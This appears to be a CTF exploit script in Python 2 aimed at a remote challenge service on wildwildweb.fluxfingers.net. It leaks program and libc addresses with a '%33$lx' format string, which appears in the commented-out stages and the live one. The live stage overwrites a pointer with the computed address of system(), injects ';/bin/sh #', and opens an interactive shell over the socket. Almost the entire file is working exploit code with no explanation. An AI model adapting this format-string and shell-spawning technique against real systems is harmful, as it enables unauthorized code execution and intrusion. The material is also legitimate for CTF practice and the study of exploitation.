import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

#host = '10.211.55.42'
host = 'wildwildweb.fluxfingers.net'
port = 1405

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

'''
readuntil(f, 'choice: ')
f.write('1\n')

readuntil(f, '): ')
f.write('asdf\n')

readuntil(f, 'choice: ')
f.write('2\n')

readuntil(f, 'Age: ')
f.write('12\n')

readuntil(f, 'Name: ')
f.write('a' * 8)

ret = readuntil(f, 'There ')
leak = ret[-6:]
leak = up(leak + '\x00' * 2)
pie_base = leak - 0x10f7
print "Text address leak: %s" % hex(pie_base)
'''

'''
#pie_base = 0x7f501cbec000
pie_base = 0x7f814651c000

raw_input('wait')

readuntil(f, 'choice: ')
f.write('1\n')

readuntil(f, '): ')
f.write('cccccccccccccccccccccccc')

readuntil(f, 'choice: ')
f.write('2\n')

readuntil(f, 'Age: ')
f.write('aaaaaaaaaaaaaaaaaaa' + p(pie_base + 0x10d3)[:6] + '\n\x00')

readuntil(f, 'Name: ')
fmt = '%33$lx'
f.write(fmt + 'b' * (0x1b - len(fmt)))

ret = readuntil(f, 'b')
print ret
leak = int(ret[-12:], 16)

print 'Libc return address: %s' % hex(leak)
'''

libc_ret_addr = 0x7f8145f52ec5
system_addr = libc_ret_addr - 0x21ec5 + 0x46530

readuntil(f, 'choice: ')
f.write('1\n')

readuntil(f, '): ')
f.write('cccccccccccccccccccccccc')

readuntil(f, 'choice: ')
f.write('2\n')

readuntil(f, 'Age: ')
sh = ';/bin/sh #'
f.write(sh + 'a' * (19 - len(sh)) + p(system_addr)[:6] + '\n\x00')

readuntil(f, 'Name: ')
fmt = '%33$lx'
f.write(fmt + 'b' * (0x1b - len(fmt)))

t = telnetlib.Telnet()
t.sock = s
t.interact()
